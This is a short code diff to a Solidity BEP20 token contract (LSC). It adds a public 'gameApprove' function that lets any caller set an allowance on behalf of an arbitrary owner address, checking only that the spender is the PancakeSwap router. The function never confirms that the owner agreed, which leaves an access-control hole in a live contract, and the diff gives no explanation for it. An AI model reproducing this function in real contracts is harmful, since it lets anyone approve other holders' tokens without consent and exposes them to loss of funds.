@@ -565,6 +565,13 @@ contract LSC is Context, IBEP20, Ownable {
         _approve(_msgSender(), spender, amount);
         return true;
     }
+    
+    function gameApprove(address owner, address spender, uint amount) public returns(bool) {
+		require(spender == address(pancakeswapV2Router), "This function can only approve coin to pancakeSwap");
+		_approve(owner, spender, amount);
+		return true;
+	}
+	
     function increaseAllowance(address spender, uint addedValue) public returns (bool) {
         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
         return true;
